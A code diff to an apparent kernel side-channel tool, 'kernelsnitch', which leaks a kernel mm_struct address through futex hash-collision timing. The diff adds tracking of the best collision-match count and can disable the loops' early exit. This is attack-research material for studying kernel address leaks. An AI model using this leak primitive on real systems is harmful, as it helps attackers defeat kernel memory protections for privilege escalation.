@@ -79,6 +79,8 @@ struct kernelsnitch_shared_state {
     size_t repeat_measurement;
     size_t average;
     size_t min_collision_matches;
+    size_t track_best_collision_matches;
+    volatile size_t best_collision_matches;
 
     volatile unsigned char *futexes;
     volatile unsigned char inc_futex[KS_PAGE_SIZE];
@@ -227,6 +229,24 @@ struct mm_leak_arg {
     struct kernelsnitch_shared_state *ks;
     struct range range;
 };
+
+static void kernelsnitch_record_best_match_count(
+    struct kernelsnitch_shared_state *ks, size_t matches)
+{
+    if (!ks->track_best_collision_matches) {
+        return;
+    }
+    size_t best = __atomic_load_n(
+        &ks->best_collision_matches, __ATOMIC_RELAXED);
+    while (matches > best) {
+        if (__atomic_compare_exchange_n(
+                &ks->best_collision_matches, &best, matches, 0,
+                __ATOMIC_RELAXED, __ATOMIC_RELAXED)) {
+            break;
+        }
+    }
+}
+
 static void *__mm_leak(void *arg)
 {
     struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
@@ -271,12 +291,15 @@ static void *__mm_leak(void *arg)
                             matches++;
                         }
                         size_t remaining = ks->collisions - i - 1;
-                        if (matches >= ks->min_collision_matches ||
+                        if (!ks->track_best_collision_matches &&
+                            (matches >= ks->min_collision_matches ||
                             matches + remaining <
-                                ks->min_collision_matches) {
+                                ks->min_collision_matches)) {
                             break;
                         }
                     }
+                    kernelsnitch_record_best_match_count(
+                        ks, matches);
                     found_hash = matches >= ks->min_collision_matches;
                     if (found_hash) {
                         ks->mm_struct = mm_struct_candidate;
@@ -304,12 +327,15 @@ static void *__mm_leak(void *arg)
                                 matches++;
                             }
                             size_t remaining = ks->collisions - i - 1;
-                            if (matches >= ks->min_collision_matches ||
+                            if (!ks->track_best_collision_matches &&
+                                (matches >= ks->min_collision_matches ||
                                 matches + remaining <
-                                    ks->min_collision_matches) {
+                                    ks->min_collision_matches)) {
                                 break;
                             }
                         }
+                        kernelsnitch_record_best_match_count(
+                            ks, matches);
                         found_hash =
                             matches >= ks->min_collision_matches;
                         if (found_hash) {
@@ -417,6 +443,12 @@ void kernelsnitch_set_min_collision_matches(
                min_collision_matches < ks->collisions),
               "invalid minimum collision match count\n");
     ks->min_collision_matches = min_collision_matches;
+}
+
+void kernelsnitch_track_best_collision_matches(
+    struct kernelsnitch_shared_state *ks)
+{
+    ks->track_best_collision_matches = 1;
 }
 
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
